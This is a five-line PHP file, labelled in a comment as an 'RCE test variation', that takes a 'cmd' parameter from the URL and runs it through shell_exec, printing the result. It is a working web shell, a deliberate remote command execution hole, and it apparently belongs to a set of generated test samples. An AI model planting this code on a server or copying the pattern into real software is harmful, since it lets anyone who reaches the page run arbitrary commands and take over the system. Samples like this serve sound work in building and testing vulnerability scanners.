<?php
// RCE test variation #1404
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>